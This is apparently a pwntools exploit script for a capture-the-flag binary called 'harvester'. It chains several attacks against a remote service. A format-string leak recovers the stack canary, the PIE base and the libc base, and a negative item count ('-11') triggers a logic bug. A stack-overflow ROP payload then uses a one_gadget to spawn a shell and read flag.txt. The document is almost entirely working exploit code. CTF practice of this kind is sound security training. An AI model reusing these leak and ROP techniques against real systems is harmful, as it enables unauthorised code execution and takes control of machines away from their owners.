from pwn import *

elf = ELF("./challenge/harvester")
libc = ELF("./challenge/libc.so.6")

conn = remote(MACHINE_IP, MACHINE_PORT)

def select_menu(menu):
    conn.recvuntil('> ')
    conn.sendline(menu)

def format_exploit(progress, index):
    progress.status("selecting menu fight")
    select_menu('1')

    progress.status("selecting weapon format string attack")
    conn.recvuntil('> ')
    conn.send(b'%%%d$p' % index);
    conn.recvuntil(b"Your choice is: ")

    progress.status("computing value")
    value = conn.recvline()
    value = value[:len(value) - 8]
    value = 0 if value == b"(nil)" else int(value, 16)
    return value

def retrieve_canary():
    with log.progress("retrieving canary") as progress:
        return format_exploit(progress, 11)

def retrieve_base_address():
    with log.progress("retrieving base address") as progress:
        fight_return = 0xeca
        base = format_exploit(progress, 13)
        elf.address = base - fight_return

def retrieve_libc_base_address():
    with log.progress("retrieving libc base address") as progress:
        libc_start_main_return = 0x21bf7
        base = format_exploit(progress, 21)
        libc.address = base - libc_start_main_return

def drop_pie(amount):
    with log.progress("dropping pies") as progress:
        progress.status("opening inventory menu")
        select_menu('2')

        progress.status("choose to drop some pies")
        conn.recvuntil('> ')
        conn.sendline('y')

        progress.status("drop specified amount")
        conn.recvuntil('> ')
        conn.sendline(amount)

def retrieve_shell():
    with log.progress("retrieving a shell") as progress:
        progress.status("opening stare menu")
        select_menu('3')

        progress.status("forging rop")
        rop = b"A" * (0x30 - 0x8)
        rop += p64(canary)

        # This value is not important
        rop += p64(0x1234567890abcdef)

        # 0x4f3d5 is the offset to open a shell with a single rop
        # See: https://github.com/david942j/one_gadget
        rop += p64(libc.address + 0x4f3d5)

        progress.status("sending rop")
        conn.recvuntil('> ')
        conn.send(rop)

        progress.status("remove error message")
        conn.recvlines(2)

def retrieve_flag():
    with log.progress("retrieving the flag") as progress:
        conn.sendline("cat flag.txt")
        log.success(conn.recvlineS())


canary = retrieve_canary()
retrieve_base_address()
retrieve_libc_base_address()

drop_pie('-11')
retrieve_shell()
retrieve_flag()
